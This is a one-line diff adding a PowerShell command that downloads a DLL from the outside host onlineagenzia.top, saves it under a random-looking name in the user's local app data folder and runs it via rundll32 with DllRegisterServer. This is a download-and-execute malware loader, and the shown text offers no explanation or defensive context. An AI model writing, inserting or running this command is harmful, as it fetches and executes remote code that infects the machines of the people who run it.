@@ -1,0 +1,1 @@
+$path = $Env:LOCALAPPDATA+'\qnjmEK.bin'; $client = New-Object System.Net.WebClient; $client.downloadfile('http://onlineagenzia.top/registr.dll',$path); C:\Windows\System32\rundll32.exe $path,DllRegisterServer 
